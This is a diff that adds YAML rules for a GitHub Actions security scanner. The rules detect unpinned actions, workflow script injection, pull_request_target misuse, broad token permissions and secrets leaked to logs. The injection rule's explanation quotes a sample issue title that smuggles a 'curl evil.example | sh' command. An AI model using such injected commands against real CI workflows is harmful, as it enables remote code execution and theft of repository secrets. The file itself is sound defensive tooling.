@@ -1,0 +1,106 @@
+# Workflows GitHub Actions du projet (OWASP Top 10 CI/CD Security Risks).
+
+- id: DOT-CI-001
+  severity: medium
+  category: config
+  refs: [CICD-SEC-3, CICD-SEC-9, A08:2025, CWE-829]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}", "**/action.{yml,yaml}"]
+    pattern: '^\s*(?:-\s*)?uses:\s*["'']?(?!\.{0,2}/|docker://|actions/|github/)[\w.-]+/[\w./-]+@(?![0-9a-f]{40}\b)'
+    firstOnly: true
+  text:
+    en:
+      title: Third-party action not pinned
+      explanation: A tag like @v1 or @main can be moved by the action's author, or by someone who stole their account; your workflow then runs the new code with your secrets (it happened with tj-actions/changed-files in 2025).
+      fix: "Pin every third-party action in the file to the full commit hash, with the version as a comment: uses: owner/action@<40-character sha> # v1.2.3. Dependabot can keep them updated."
+
+- id: DOT-CI-002
+  severity: low
+  category: config
+  refs: [CICD-SEC-3, A08:2025, CWE-829]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}", "**/action.{yml,yaml}"]
+    pattern: '^\s*(?:-\s*)?uses:\s*["'']?(?:actions|github)/[\w./-]+@(?![0-9a-f]{40}\b)'
+    firstOnly: true
+  text:
+    en:
+      title: Official action not pinned
+      explanation: GitHub's own actions are safer than others, but a tag (@v4) can still move; pinning the hash guarantees you run exactly the code you reviewed.
+      fix: "For every action in the file: uses: actions/checkout@<40-character sha> # v4.2.2; Dependabot (package-ecosystem: github-actions) keeps hashes up to date."
+
+- id: DOT-CI-003
+  severity: high
+  category: code
+  refs: [CICD-SEC-4, A05:2025, CWE-78]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}", "**/action.{yml,yaml}"]
+    pattern: '\$\{\{\s*github\.(?:event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|pages\.[^}]*\.page_name|commits\.[^}]*\.(?:message|author\.(?:email|name))|head_commit\.(?:message|author\.(?:email|name))|discussion\.(?:title|body)|workflow_run\.(?:head_branch|display_title|head_commit\.message))|head_ref)\s*\}\}'
+    ignoreIf: ['^\s*(?:-\s*)?(?!run\b)[\w-]+\s*:\s*["'']?\$\{\{', '^\s*(?:-\s*)?if\s*:']
+  text:
+    en:
+      title: Untrusted text injected into a workflow command
+      explanation: An issue, PR or commit title is written by anyone. Placed in run:, it becomes shell; a title like 'a"; curl evil.example | sh #' steals your secrets.
+      fix: "Pass the value through an environment variable and quote it: env: TITLE: ${{ github.event.issue.title }} then run: echo \"$TITLE\"."
+
+- id: DOT-CI-004
+  severity: critical
+  category: config
+  refs: [CICD-SEC-4, A08:2025, CWE-829]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}"]
+    fileMustMatch: '^\s*(?:-\s*)?pull_request_target\b|^on:\s*\[?[^\n]*\bpull_request_target\b'
+    pattern: '\bref:\s*["'']?\$\{\{\s*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref)\b|\brefs/pull/\$\{\{'
+  text:
+    en:
+      title: pull_request_target running the PR's code
+      explanation: pull_request_target runs with your secrets and a write token. Checking out the PR's code and then building or testing it lets any stranger run their code with your rights.
+      fix: Use pull_request (no secrets) to build and test proposed code; keep pull_request_target for steps that don't read the PR's code (labels, comments).
+
+- id: DOT-CI-005
+  severity: medium
+  category: config
+  refs: [CICD-SEC-5, NHI5:2025, CWE-250]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}"]
+    pattern: '^\s*permissions\s*:\s*["'']?write-all\b'
+  text:
+    en:
+      title: Workflow token with every permission
+      explanation: With write-all, a compromised step (trapped action, dependency) can push code, publish a release or change your settings.
+      fix: "Declare only what you need: permissions: contents: read at workflow level, and add one specific write permission on the job that needs it."
+
+- id: DOT-CI-006
+  severity: low
+  category: config
+  refs: [CICD-SEC-5, CWE-250]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}"]
+    pattern: '^["'']?on["'']?\s*:'
+    unlessFile: ['^\s*permissions\s*:']
+    firstOnly: true
+  text:
+    en:
+      title: Workflow without a permissions block
+      explanation: Without a permissions block, the token gets the repo's default rights, often write access on older or organization repos.
+      fix: "Add at the top of the file: permissions: contents: read, then widen job by job if needed."
+
+- id: DOT-CI-007
+  severity: medium
+  category: secret
+  refs: [CICD-SEC-6, NHI2:2025, CWE-532]
+  detector:
+    type: regex
+    files: ["**/.github/workflows/*.{yml,yaml}", "**/action.{yml,yaml}"]
+    pattern: '\b(?:echo|printf|cat\s*<<)\b[^\n]*\$\{\{\s*secrets\.'
+    ignoreIf: ['\$\{\{\s*secrets\.[^}]*\}\}["'']?\s*>{1,2}\s*\S', '\|\s*(?:docker\s+login|gh\s+auth\s+login|npm\s+config|helm\s+registry\s+login)\b.*--password-stdin|\|\s*\w[\w-]*\s+login\b']
+  text:
+    en:
+      title: Secret printed in workflow logs
+      explanation: GitHub masks a secret written as is, but not a transformed version (encoded, split, in a published file). Logs of a public repo are readable by anyone.
+      fix: "Don't echo a secret: pass it as an environment variable to the command that needs it (env: TOKEN: ${{ secrets.TOKEN }})."
